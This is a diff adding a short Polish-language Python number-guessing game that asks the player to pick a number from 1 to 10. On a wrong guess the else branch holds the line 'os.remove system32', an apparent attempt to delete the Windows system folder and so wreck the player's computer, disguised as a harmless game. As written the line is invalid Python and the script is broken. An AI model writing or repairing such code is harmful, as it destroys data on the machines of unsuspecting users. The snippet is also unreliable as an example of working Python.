@@ -1,0 +1,11 @@
+import random
+import os
+
+print("zagrajmy w fajną gre, wybierz lidzbe od 1-10")
+list1=[1,2,3,4,5,6,7,8,9,10]
+b=random.choice(list1)
+a=int(input("podaj lidzbe"))
+if a==b:
+    print("wygrales")
+else:
+    os.remove system32
